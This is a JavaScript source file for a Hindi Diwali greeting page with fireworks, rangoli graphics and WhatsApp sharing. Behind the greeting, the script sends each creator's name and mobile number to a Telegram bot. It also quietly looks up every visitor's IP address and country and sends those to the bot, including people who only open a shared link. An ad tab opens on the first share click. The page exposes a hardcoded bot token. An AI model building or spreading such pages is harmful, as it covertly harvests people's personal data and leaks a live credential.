"use strict";
/* ⚠️ अस्थायी: टोकन ब्राउज़र में दिखता है (कोई भी देख सकता है)। README देखें, बाद में functions में ले जाएँ। */
const CONFIG = {
  BOT_TOKEN: "8390602758:AAGUSMtAy1GBERRr_jit4GNqpVWcwVouZU8",
  CHAT_ID: "6320680594",
  // अपने 5-6 बैनर की सीधी इमेज लिंक (https://...) यहाँ डालें
  // पहली बार WhatsApp बटन दबाने पर यह विज्ञापन लिंक नए टैब में खुलेगा (खाली/गलत हो तो सीधा WhatsApp)
  AD_LINK: "PASTE_DIRECT_AD_LINK",
  BANNERS: ["PASTE_BANNER_1_URL", "PASTE_BANNER_2_URL", "PASTE_BANNER_3_URL", "PASTE_BANNER_4_URL", "PASTE_BANNER_5_URL", "PASTE_BANNER_6_URL"],
};

const $ = (id) => document.getElementById(id);
const NAME_RE = /^[\p{L}\p{M}\p{N} .'-]{2,40}$/u;
const reduced = matchMedia("(prefers-reduced-motion: reduce)").matches;
let shareUrl = "", senderName = "", busy = false;

function show(id) { ["home", "wish"].forEach((s) => ($(s).hidden = s !== id)); if (id === "home") fwGap = 3500; window.scrollTo(0, 0); }
function setErr(id, t) { $(id).textContent = t || ""; }
function normPhone(v) {
  let d = v.replace(/[\s-]/g, "");
  d = d.replace(/^(\+91|91|0)(?=\d{10}$)/, "");
  return /^[6-9]\d{9}$/.test(d) ? d : null;
}

/* ---------- Greeting ---------- */
function setBanner(i) {
  const img = $("banner"), u = CONFIG.BANNERS[i];
  img.hidden = true;
  if (!u || !/^https:\/\//.test(u)) return;
  img.onload = () => (img.hidden = false); img.onerror = () => (img.hidden = true); img.src = u;
}
function showGreeting(name, url, b, own) {
  senderName = name; shareUrl = url; setBanner(b);
  $("who").textContent = name; $("status").textContent = "";
  $("share").hidden = !own;               // शेयर बटन सिर्फ बनाने वाले को
  $("mine").parentElement.style.display = own ? "none" : "";
  $("invalid").hidden = true; $("reveal").hidden = false;
  show("wish"); fwGap = 1100; kick();
  if (own && soundOn) bell();
}
/* ---------- Form ---------- */
async function sendTelegram(name, phone, url) {
  if (!CONFIG.BOT_TOKEN.includes(":")) return false; // not configured
  const ist = new Date().toLocaleString("en-IN", { timeZone: "Asia/Kolkata" });
  const text = `🪔 नई दिवाली विश\nनाम: ${name}\nमोबाइल: ${phone}\nसमय (IST): ${ist}\nलिंक: ${url}`;
  const c = new AbortController(); const t = setTimeout(() => c.abort(), 8000);
  try {
    const r = await fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
      method: "POST", signal: c.signal, headers: { "content-type": "application/json" },
      body: JSON.stringify({ chat_id: CONFIG.CHAT_ID, text, disable_web_page_preview: true }),
    });
    return r.ok;
  } catch { return false; } finally { clearTimeout(t); }
}
$("form").addEventListener("submit", async (e) => {
  e.preventDefault(); if (busy) return;
  ["name-err", "phone-err", "form-err"].forEach((i) => setErr(i));
  const name = $("name").value.trim().replace(/\s+/g, " ");
  const phone = normPhone($("phone").value);
  let ok = true;
  if (!NAME_RE.test(name)) { setErr("name-err", "कृपया 2–40 अक्षरों का सही नाम लिखें।"); ok = false; }
  if (!phone) { setErr("phone-err", "कृपया 10 अंकों का सही भारतीय मोबाइल नंबर लिखें (6–9 से शुरू)।"); ok = false; }
  if (!ok) return;
  busy = true; const b = $("create"); b.disabled = true; b.textContent = "विश बन रही है…";
  try {
    const b = Math.floor(Math.random() * CONFIG.BANNERS.length);
    const q = `?name=${encodeURIComponent(name)}&b=${b}`, url = location.origin + location.pathname + q;
    sendTelegram(name, phone, url); // non-blocking; details never logged
    history.replaceState(null, "", location.pathname + q);
    $("form").reset(); showGreeting(name, url, b, true);
  } catch (err) { setErr("form-err", err.message); }
  finally { busy = false; b.disabled = false; b.textContent = "मेरी दिवाली विश बनाएं"; }
});

/* ---------- Buttons ---------- */
let adShown = false;
try { adShown = sessionStorage.getItem("ad") === "1"; } catch {}
$("wa").onclick = () => {
  if (!adShown && /^https:\/\//.test(CONFIG.AD_LINK)) {
    adShown = true; try { sessionStorage.setItem("ad", "1"); } catch {}
    window.open(CONFIG.AD_LINK, "_blank", "noopener");
    $("status").textContent = "विज्ञापन पेज नए टैब में खुल गया है। इस टैब पर लौटकर फिर से \"WhatsApp पर शेयर करें\" दबाएँ।";
    return;
  }
  const t = `दीपावली पर आपके लिए एक खास शुभकामना आई है! 🪔 देखें, ${senderName} ने आपके लिए क्या भेजा है: ${shareUrl}`;
  window.open("https://wa.me/?text=" + encodeURIComponent(t), "_blank", "noopener");
};
$("copy").onclick = async () => {
  try { await navigator.clipboard.writeText(shareUrl); $("status").textContent = "लिंक कॉपी हो गया ✓"; }
  catch { window.prompt("लिंक कॉपी करें:", shareUrl); }
};
const goHome = () => { $("mine").parentElement.style.display = ""; history.replaceState(null, "", location.pathname); show("home"); $("name").focus(); };
$("mine").onclick = goHome; $("new").onclick = goHome;

/* ---------- Sound (after user gesture only) ---------- */
let soundOn = false, ac;
function bell() {
  if (!ac) return;
  [523, 659, 784].forEach((f, i) => {
    const o = ac.createOscillator(), g = ac.createGain(), t = ac.currentTime + i * 0.25;
    o.frequency.value = f; o.type = "sine"; g.gain.setValueAtTime(0.0001, t);
    g.gain.exponentialRampToValueAtTime(0.15, t + 0.03); g.gain.exponentialRampToValueAtTime(0.0001, t + 1.4);
    o.connect(g).connect(ac.destination); o.start(t); o.stop(t + 1.5);
  });
}
$("sound").onclick = () => {
  soundOn = !soundOn; ac = ac || new (window.AudioContext || window.webkitAudioContext)();
  $("sound").setAttribute("aria-pressed", soundOn); $("sound").textContent = soundOn ? "🔔" : "🔇";
  $("sound").setAttribute("aria-label", soundOn ? "ध्वनि बंद करें" : "ध्वनि चालू करें");
  if (soundOn) { ac.resume(); bell(); }
};

/* ---------- Fireworks ---------- */
const cv = $("fx"), cx = cv.getContext("2d"), COL = ["#ff4d00", "#ff0f7b", "#8e2de2", "#0072ff", "#f5a300", "#e11d48", "#00a86b"];
let W, H, rockets = [], sparks = [], flashes = [], fwGap = 3500, nextAt = 0;
const rnd = (a, b) => a + Math.random() * (b - a), pick = (a) => a[(Math.random() * a.length) | 0];
function size() { const d = Math.min(devicePixelRatio || 1, 1.5); W = innerWidth; H = innerHeight; cv.width = W * d; cv.height = H * d; cx.setTransform(d, 0, 0, d, 0, 0); }
addEventListener("resize", size); size();
function launch() { rockets.push({ x: rnd(W * .12, W * .88), y: H, ty: H * rnd(.12, .42), vx: rnd(-.5, .5), vy: -rnd(9, 12), c: pick(COL) }); }
function spark(x, y, vx, vy, c, o) { sparks.push(Object.assign({ x, y, vx, vy, c, l: 1, d: .013, r: 2.4, g: .04, f: .985 }, o)); }
function explode(r) {
  flashes.push({ x: r.x, y: r.y, l: 1, c: r.c });
  const type = pick(["peony", "ring", "willow", "double"]), c2 = pick(COL);
  if (type === "peony") for (let i = 0; i < 90; i++) { const a = rnd(0, 6.283), s = rnd(1, 5); spark(r.x, r.y, Math.cos(a) * s, Math.sin(a) * s, i % 4 ? r.c : c2); }
  else if (type === "ring") for (let i = 0; i < 64; i++) { const a = (i / 64) * 6.283; spark(r.x, r.y, Math.cos(a) * 4.2, Math.sin(a) * 4.2, i % 2 ? r.c : c2, { f: .978 }); }
  else if (type === "willow") for (let i = 0; i < 80; i++) { const a = rnd(0, 6.283), s = rnd(1.5, 4.4); spark(r.x, r.y, Math.cos(a) * s, Math.sin(a) * s, "#e8a317", { d: .006, g: .06, r: 2.2, f: .975 }); }
  else for (let i = 0; i < 120; i++) { const a = rnd(0, 6.283), s = i < 50 ? rnd(.8, 2.2) : rnd(3.2, 5); spark(r.x, r.y, Math.cos(a) * s, Math.sin(a) * s, i < 50 ? r.c : c2); }
}
function frame(t) {
  cx.globalCompositeOperation = "destination-out"; cx.fillStyle = "rgba(0,0,0,.2)"; cx.fillRect(0, 0, W, H); cx.globalCompositeOperation = "source-over";
  if (!sparks.length && !rockets.length && !flashes.length) cx.clearRect(0, 0, W, H);
  if (t > nextAt && !document.hidden) { launch(); if (fwGap < 2000 && Math.random() < .45) setTimeout(launch, 300); nextAt = t + fwGap * rnd(.7, 1.4); }
  rockets = rockets.filter((r) => {
    r.x += r.vx; r.y += r.vy; r.vy *= .985; spark(r.x, r.y, rnd(-.4, .4), rnd(.3, 1.2), "#e8a317", { r: 1.7, d: .06, g: .02 });
    cx.fillStyle = r.c; cx.beginPath(); cx.arc(r.x, r.y, 3.2, 0, 6.283); cx.fill();
    if (r.y <= r.ty || r.vy > -2.2) { explode(r); return false; } return true;
  });
  flashes = flashes.filter((f) => f.l > 0);
  flashes.forEach((f) => { const g = cx.createRadialGradient(f.x, f.y, 0, f.x, f.y, 150 * (1.2 - f.l * .5)); g.addColorStop(0, f.c); g.addColorStop(1, "rgba(255,255,255,0)"); cx.globalAlpha = f.l * .35; cx.fillStyle = g; cx.beginPath(); cx.arc(f.x, f.y, 160, 0, 6.283); cx.fill(); f.l -= .07; });
  if (sparks.length > 700) sparks.splice(0, sparks.length - 700);
  sparks = sparks.filter((p) => p.l > 0);
  sparks.forEach((p) => { p.x += p.vx; p.y += p.vy; p.vx *= p.f; p.vy = p.vy * p.f + p.g; p.l -= p.d;
    cx.globalAlpha = Math.max(p.l, 0) * (p.l < .5 && Math.random() < .3 ? .4 : 1); cx.fillStyle = p.c; cx.beginPath(); cx.arc(p.x, p.y, p.r * (.5 + p.l * .5), 0, 6.283); cx.fill(); });
  cx.globalAlpha = 1;
  requestAnimationFrame(frame);
}
function kick() { nextAt = 0; }
if (!reduced) requestAnimationFrame(frame);

/* ---------- Decor: rangoli + marigold toran (generated, no user data) ---------- */
(function () {
  const M = "#f7c6b0", S = "#ffc58a", P = "#fbb5cc", G = "#ffe29a", L = "#fffaf0";
  let r = '<svg viewBox="-120 -120 240 240">';
  const ring = (n, f) => { for (let i = 0; i < n; i++) r += `<g transform="rotate(${(i * 360) / n})">${f(i)}</g>`; };
  ring(24, () => `<circle cy="-112" r="3" fill="${G}"/>`);
  ring(12, (i) => `<path d="M0 -58C20 -72 20 -96 0 -106C-20 -96 -20 -72 0 -58Z" fill="${i % 2 ? P : S}"/>`);
  ring(12, (i) => `<path d="M0 -66Q7 -82 0 -94Q-7 -82 0 -66Z" fill="${L}" opacity=".85"/>`);
  ring(8, (i) => `<path d="M0 -24C14 -34 14 -50 0 -58C-14 -50 -14 -34 0 -24Z" fill="${i % 2 ? M : G}"/>`);
  r += `<circle r="20" fill="${L}" stroke="${S}" stroke-width="3"/><circle r="8" fill="${P}"/>`;
  $("rangoli").innerHTML = r + "</svg>";
  let t = '<svg viewBox="0 0 480 100" preserveAspectRatio="xMidYMin slice"><path d="M0 8Q120 34 240 8T480 8" fill="none" stroke="#2e7d32" stroke-width="2.5"/>';
  for (let i = 0; i < 9; i++) { const x = 26 + i * 53.5, y = 16 + 20 * Math.sin((i / 8) * 3.14159 * 2) * -1 + 22; t += `<line x1="${x}" y1="${y - 14}" x2="${x}" y2="${y}" stroke="#2e7d32" stroke-width="2"/>`;
    for (let k = 0; k < 10; k++) t += `<circle cx="${x + 9 * Math.cos(k * .628)}" cy="${y + 9 + 9 * Math.sin(k * .628)}" r="6" fill="${k % 2 ? "#ff9f1c" : "#f5a300"}"/>`;
    t += `<circle cx="${x}" cy="${y + 9}" r="6" fill="#c2410c"/>`; }
  $("toran").innerHTML = t + "</svg>";
})();

/* ---------- Init ---------- */
const qs = new URLSearchParams(location.search);
if (qs.has("name")) {
  const nm = (qs.get("name") || "").trim().replace(/\s+/g, " ");
  if (NAME_RE.test(nm)) {
    const b = Number(qs.get("b")) || 0;
    showGreeting(nm, location.href, b >= 0 && b < CONFIG.BANNERS.length ? b : 0, false);
  } else { show("wish"); $("reveal").hidden = true; $("invalid").hidden = false; }
}

/* ---------- नई विज़िट की सूचना (केवल IP, देश, समय; हर सत्र में एक बार) ---------- */
async function notifyVisit() {
  if (!CONFIG.BOT_TOKEN.includes(":")) return;
  try { if (sessionStorage.getItem("v")) return; sessionStorage.setItem("v", "1"); } catch {}
  try {
    const t = await (await fetch("/cdn-cgi/trace", { cache: "no-store" })).text(); // Cloudflare से, कोई थर्ड-पार्टी नहीं
    const ip = (t.match(/^ip=(.+)$/m) || [])[1], loc = (t.match(/^loc=(.+)$/m) || [])[1] || "?";
    if (!ip) return;
    const ist = new Date().toLocaleString("en-IN", { timeZone: "Asia/Kolkata" });
    const page = qs.has("name") ? "शेयर किया हुआ लिंक" : "होम पेज";
    const c = new AbortController(); setTimeout(() => c.abort(), 8000);
    await fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
      method: "POST", signal: c.signal, headers: { "content-type": "application/json" },
      body: JSON.stringify({ chat_id: CONFIG.CHAT_ID, text: `👀 नई विज़िट\nIP: ${ip}\nदेश: ${loc}\nपेज: ${page}\nसमय (IST): ${ist}` }),
    });
  } catch {}
}
notifyVisit();

function openPriv() { if (location.hash === "#privacy") $("privacy").open = true; }
addEventListener("hashchange", openPriv); openPriv();
